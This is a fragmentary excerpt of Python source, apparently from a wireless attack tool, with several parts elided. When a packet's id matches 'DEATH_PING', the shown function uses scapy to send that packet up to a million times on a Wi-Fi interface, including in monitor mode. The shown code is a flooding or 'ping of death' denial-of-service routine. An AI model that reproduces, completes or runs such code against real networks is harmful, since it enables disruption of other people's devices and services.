...
def start(packet, id: bytes, _verbose: int = 1, monitor_mode: bool = False):
    # IMPORT
    import sys
    ...
    if id.decode("ascii") == Packets.DEATH_PING:
        ...
        if sys.platform == "win32":
            if monitor_mode == False:
                ...
                sendp(packet, inter = 0.2, count = 1000000, verbose = _verbose, monitor = True)
        else:
            if monitor_mode == False:
                sendp(packet, inter = 0.2, count = 1000000, verbose = _verbose, iface = "wlan0")
            else:
                sendp(packet, inter = 0.2, count = 1000000, verbose = _verbose, iface = "wlan0mon")
    else:
